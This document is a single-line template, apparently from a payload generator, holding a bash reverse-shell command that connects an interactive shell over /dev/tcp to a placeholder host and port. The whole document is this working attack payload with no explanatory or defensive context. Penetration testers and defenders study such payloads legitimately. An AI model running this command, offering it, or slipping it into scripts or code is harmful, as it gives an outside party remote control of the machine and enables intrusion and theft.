bash -i >& /dev/tcp/{{ host.ip }}/{{ host.port }} 0>&1
